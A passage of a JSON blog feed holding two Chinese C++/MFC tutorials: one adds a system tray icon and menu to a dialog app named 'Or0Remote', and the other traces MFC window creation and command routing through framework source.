keyword\">sizeof</span><span class=\"token punctuation\">(</span>nid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 大小赋值</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nid<span class=\"token punctuation\">.</span>hWnd <span class=\"token operator\">=</span> m_hWnd<span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 父窗口</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>nid<span class=\"token punctuation\">.</span>uID <span class=\"token operator\">=</span> IDR_MAINFRAME<span class=\"token punctuation\">;</span>     <span class=\"token comment\">//icon  ID</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nid<span class=\"token punctuation\">.</span>uFlags <span class=\"token operator\">=</span> NIF_MESSAGE <span class=\"token operator\">|</span> NIF_ICON <span class=\"token operator\">|</span> NIF_TIP<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 托盘所拥有的状态</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>nid<span class=\"token punctuation\">.</span>uCallbackMessage <span class=\"token operator\">=</span> UM_ICONNOTIFY<span class=\"token punctuation\">;</span>            <span class=\"token comment\">// 回调消息</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nid<span class=\"token punctuation\">.</span>hIcon <span class=\"token operator\">=</span> m_hIcon<span class=\"token punctuation\">;</span>                            <span class=\"token comment\">//icon 变量</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>CString str <span class=\"token operator\">=</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Or0Remote编写中……\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 气泡提示</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">lstrcpyn</span><span class=\"token punctuation\">(</span>nid<span class=\"token punctuation\">.</span>szTip<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPCTSTR<span class=\"token punctuation\">)</span>str<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>nid<span class=\"token punctuation\">.</span>szTip<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>nid<span class=\"token punctuation\">.</span>szTip<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">Shell_NotifyIcon</span><span class=\"token punctuation\">(</span>NIM_ADD<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>nid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 显示托盘</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>pch.h 文件中加入自定义消息的定义</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 自定义消息</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">enum</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tUM_ICONNOTIFY<span class=\"token operator\">=</span> WM_USER<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"6\">\n<li>\n<p>发现在窗口销毁时托盘依然存在</p>\n</li>\n<li>\n<p>添加  <code>WM_CLOSE</code>  消息并写入代码:</p>\n</li>\n</ol>\n<p><code>Shell_NotifyIcon(NIM_DELETE, &amp;nid); //销毁图标</code></p>\n<ol start=\"8\">\n<li>在对话框类中声明消息处理函数:</li>\n</ol>\n<p><code>afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);</code></p>\n<ol start=\"9\">\n<li>在 cpp 文件中写入代码:</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">COr0RemoteDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnIconNotify</span><span class=\"token punctuation\">(</span>WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>UINT<span class=\"token punctuation\">)</span>lParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">case</span> WM_LBUTTONDOWN<span class=\"token operator\">:</span> <span class=\"token comment\">// click or dbclick left button on icon</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">case</span> WM_LBUTTONDBLCLK<span class=\"token operator\">:</span> <span class=\"token comment\">// should show desktop</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">IsWindowVisible</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t\t<span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_HIDE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">case</span> WM_RBUTTONDOWN<span class=\"token operator\">:</span> <span class=\"token comment\">// click right button, show menu</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tCMenu menu<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tmenu<span class=\"token punctuation\">.</span><span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span>IDR_MENU_NOTIFY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\tCPoint point<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token function\">GetCursorPos</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>point<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token function\">SetForegroundWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\tmenu<span class=\"token punctuation\">.</span><span class=\"token function\">GetSubMenu</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">TrackPopupMenu</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\tTPM_LEFTBUTTON <span class=\"token operator\">|</span> TPM_RIGHTBUTTON<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\tpoint<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> point<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token function\">PostMessage</span><span class=\"token punctuation\">(</span>WM_USER<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"10\">\n<li>绑定消息映射</li>\n</ol>\n<p><code>ON_MESSAGE(UM_ICONNOTIFY, (LRESULT (__thiscall CWnd::* )(WPARAM,LPARAM))OnIconNotify)</code></p>\n<p>此时就可以响应我们的右键消息了。</p>\n<p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>但右键事件还没有对应的事件处理函数。</p>\n<ol start=\"11\">\n<li>添加显示菜单消息响应</li>\n</ol>\n<p>老样子，在类视图中对对话框类右键选择属性，然后选择事件，查找对应的事件并添加响应的处理函数。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">COr0RemoteDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnNotifyClose</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加命令处理程序代码</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">PostMessage</span><span class=\"token punctuation\">(</span>WM_CLOSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">COr0RemoteDlg</span><span class=\"token operator\">::</span><span class=\"token function\">OnNotifyShow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// TODO: 在此添加命令处理程序代码</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token function\">ShowWindow</span><span class=\"token punctuation\">(</span>SW_SHOW<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>消息已经正常响应了。</p>\n<p>至此界面框架编写完毕。</p>\n",
            "tags": [
                "远控界面编写"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-05%E5%91%BD%E4%BB%A4%E4%BC%A0%E9%80%92/",
            "url": "https://or0kit.github.io/Programming/MFC/MFC%E5%85%AD%E5%A4%A7%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6-05%E5%91%BD%E4%BB%A4%E4%BC%A0%E9%80%92/",
            "title": "MFC六大核心机制-05命令传递",
            "date_published": "2022-06-03T14:24:47.000Z",
            "content_html": "<h1 id=\"什么是命令传递\"><a class=\"anchor\" href=\"#什么是命令传递\">#</a> 什么是命令传递</h1>\n<p>消息会按照规定的路线，游走于各个对象之间，直到找到它的消息处理函数；如果找不到，则最终把它交给 <code>::DefWindowPro</code>  函数去处理。</p>\n<h2 id=\"本节需要掌握的知识点\"><a class=\"anchor\" href=\"#本节需要掌握的知识点\">#</a> 本节需要掌握的知识点</h2>\n<p>1、本节必须掌握的知识点</p>\n<p><strong>通过单步调试，熟悉窗口过程处理函数在 MFC 的实现和命令传递的方式</strong></p>\n<p>2、需要简单了解的内容</p>\n<p><code>MessageMapFunctions</code></p>\n<h1 id=\"找到mfc的窗口的消息处理函数\"><a class=\"anchor\" href=\"#找到mfc的窗口的消息处理函数\">#</a> 找到 MFC 的窗口的消息处理函数</h1>\n<h2 id=\"create-函数\"><a class=\"anchor\" href=\"#create-函数\">#</a> Create 函数</h2>\n<p>通过  <code>Create</code>  函数来看窗口创建流程</p>\n<p>之前我们了解过  <code>Create</code>  函数，其第一个参数（类名）为 NULL，则以 MFC 内建的窗口类产生一个标准的外框窗口，既然它有窗口类那肯定就有窗口过程处理函数，我们需要从这个函数入手下断点去跟进。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">CMainWindow</span><span class=\"token operator\">::</span><span class=\"token function\">CMainWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">Create</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello World!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\tWS_OVERLAPPED <span class=\"token operator\">|</span> WS_CAPTION <span class=\"token operator\">|</span> WS_SYSMENU <span class=\"token operator\">|</span> WS_THICKFRAME <span class=\"token operator\">|</span> WS_MAXIMIZEBOX <span class=\"token operator\">|</span> WS_VSCROLL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token comment\">// 左上角，既起始位置是（400,300），右下角（800,700）</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token comment\">// 700 -300 是高度  800-400 是宽度</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token function\">CRect</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span> <span class=\"token number\">300</span><span class=\"token punctuation\">,</span> <span class=\"token number\">800</span><span class=\"token punctuation\">,</span> <span class=\"token number\">700</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>单步跟进后，进入 <code>CFrameWnd::Create</code> ，  <code>Create</code>  函数是一个虚函数。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token class-name\">CFrameWnd</span><span class=\"token operator\">::</span><span class=\"token function\">Create</span><span class=\"token punctuation\">(</span>LPCTSTR lpszClassName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tLPCTSTR lpszWindowName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tDWORD dwStyle<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">const</span> RECT<span class=\"token operator\">&amp;</span> rect<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tCWnd<span class=\"token operator\">*</span> pParentWnd<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tLPCTSTR lpszMenuName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tDWORD dwExStyle<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tCCreateContext<span class=\"token operator\">*</span> pContext<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tHMENU hMenu <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lpszMenuName <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token comment\">// load in a menu that will get destroyed when window gets destroyed</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\tHINSTANCE hInst <span class=\"token operator\">=</span> <span class=\"token function\">AfxFindResourceHandle</span><span class=\"token punctuation\">(</span>lpszMenuName<span class=\"token punctuation\">,</span> ATL_RT_MENU<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>hMenu <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">LoadMenu</span><span class=\"token punctuation\">(</span>hInst<span class=\"token punctuation\">,</span> lpszMenuName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t<span class=\"token function\">TRACE</span><span class=\"token punctuation\">(</span>traceAppMsg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Warning: failed to load menu for CFrameWnd.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t<span class=\"token function\">PostNcDestroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// perhaps delete the C++ object</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tm_strTitle <span class=\"token operator\">=</span> lpszWindowName<span class=\"token punctuation\">;</span>    <span class=\"token comment\">// save title for later</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">CreateEx</span><span class=\"token punctuation\">(</span>dwExStyle<span class=\"token punctuation\">,</span> lpszClassName<span class=\"token punctuation\">,</span> lpszWindowName<span class=\"token punctuation\">,</span> dwStyle<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\trect<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span>top<span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span>right <span class=\"token operator\">-</span> rect<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> rect<span class=\"token punctuation\">.</span>bottom <span class=\"token operator\">-</span> rect<span class=\"token punctuation\">.</span>top<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tpParentWnd<span class=\"token operator\">-></span><span class=\"token function\">GetSafeHwnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hMenu<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span>pContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token function\">TRACE</span><span class=\"token punctuation\">(</span>traceAppMsg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Warning: failed to create CFrameWnd.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hMenu <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token function\">DestroyMenu</span><span class=\"token punctuation\">(</span>hMenu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"createex-函数\"><a class=\"anchor\" href=\"#createex-函数\">#</a> CreateEx 函数</h2>\n<p>而后会进入  <code>CreateEx</code>  函数中：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token class-name\">CWnd</span><span class=\"token operator\">::</span><span class=\"token function\">CreateEx</span><span class=\"token punctuation\">(</span>DWORD dwExStyle<span class=\"token punctuation\">,</span> LPCTSTR lpszClassName<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tLPCTSTR lpszWindowName<span class=\"token punctuation\">,</span> DWORD dwStyle<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> nWidth<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> nHeight<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tHWND hWndParent<span class=\"token punctuation\">,</span> HMENU nIDorHMenu<span class=\"token punctuation\">,</span> LPVOID lpParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>lpszClassName <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">||</span> <span class=\"token function\">AfxIsValidString</span><span class=\"token punctuation\">(</span>lpszClassName<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token function\">AfxIsValidAtom</span><span class=\"token punctuation\">(</span>lpszClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token function\">ENSURE_ARG</span><span class=\"token punctuation\">(</span>lpszWindowName <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">||</span> <span class=\"token function\">AfxIsValidString</span><span class=\"token punctuation\">(</span>lpszWindowName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">// allow modification of several common create parameters</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tCREATESTRUCT cs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>dwExStyle <span class=\"token operator\">=</span> dwExStyle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>lpszClass <span class=\"token operator\">=</span> lpszClassName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>lpszName <span class=\"token operator\">=</span> lpszWindowName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>style <span class=\"token operator\">=</span> dwStyle<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>cx <span class=\"token operator\">=</span> nWidth<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>cy <span class=\"token operator\">=</span> nHeight<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>hwndParent <span class=\"token operator\">=</span> hWndParent<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>hMenu <span class=\"token operator\">=</span> nIDorHMenu<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>hInstance <span class=\"token operator\">=</span> <span class=\"token function\">AfxGetInstanceHandle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>lpCreateParams <span class=\"token operator\">=</span> lpParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">PreCreateWindow</span><span class=\"token punctuation\">(</span>cs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token function\">PostNcDestroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token function\">AfxHookWindowCreate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\tHWND hWnd <span class=\"token operator\">=</span> <span class=\"token function\">CreateWindowEx</span><span class=\"token punctuation\">(</span>cs<span class=\"token punctuation\">.</span>dwExStyle<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>lpszClass<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\tcs<span class=\"token punctuation\">.</span>lpszName<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>cx<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>cy<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\tcs<span class=\"token punctuation\">.</span>hwndParent<span 